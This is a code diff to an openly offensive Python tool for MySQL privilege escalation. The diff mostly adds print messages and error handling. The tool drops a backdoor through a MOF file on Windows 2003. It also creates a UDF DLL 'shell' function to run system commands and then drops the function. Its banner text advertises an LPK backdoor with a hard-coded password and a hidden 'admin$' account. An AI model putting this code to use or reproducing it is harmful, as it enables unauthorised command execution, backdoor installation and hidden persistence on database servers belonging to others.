@@ -1,7 +1,7 @@
-#coding:UTF-8
+#coding=utf-8
 #Using for mysql promote privileges
 #Author v5est0r http://wwww.zi0n.cn
-#source c:/1.txt;mysql低权限
+#mysql低权限
 
 import pymysql,os,ConfigParser
 import argparse
@@ -23,8 +23,8 @@ Installed t00ls LPK backdoor,combination key："1,2",PWD:binghesec
 LPK add user:admin$,PWD:789456123+abc'''
 
 success_mof = '''\
-It will dump & execute backdoor but it only fit for win2003!'''
-
+Dumped backdoor & MOF successfully!
+Mof file will execute backdoor but it only fit for win2003!'''
 
 print(tool_intro)
 
@@ -54,6 +54,7 @@ def conn_mysql():
 
 def mof_execute():
     # 替换目录下hex.txt内容为你的木马的hex
+    print("You must put your backdoor's hex file in this dir!")
     f = open('hex.txt', 'r')
     content = f.read()
     hex_mof_backdoor = content
@@ -146,7 +147,7 @@ def udf_dump():
         pass
 
     # 本地模式强制创建`lib/plugin/`目录
-    if conn.host == '127.0.0.1':
+    if conn.host=='127.0.0.1' or conn.host=='localhost':
         try:
             os.makedirs(mysql_rootpath + 'lib/plugin')
         except:
@@ -182,15 +183,20 @@ def udf_dump():
         cursor.execute(sql_create_func)
     except:
         pass
-    cursor.execute(sql_exex_cmd)
-    res_cmd_resul = cursor.fetchall()
-    for row in res_cmd_resul:
-        cmd_result = "%s" % row
+    #执行udf,取结果
+    try:
+        cursor.execute(sql_exex_cmd)
+        res_cmd_resul = cursor.fetchall()
+        for row in res_cmd_resul:
+            cmd_result = "%s" % row
 
-    print('Command Query Result:')
-    print("-----------------------------------------------------")
-    print (cmd_result)
-    cursor.execute('drop function shell;')
+        print('Command Query Result:')
+        print("-----------------------------------------------------")
+        print (cmd_result)
+        cursor.execute('drop function shell;')
+    except:
+        print("DLL file created function failed or it has some anti virus.")
+
     return;
 
 
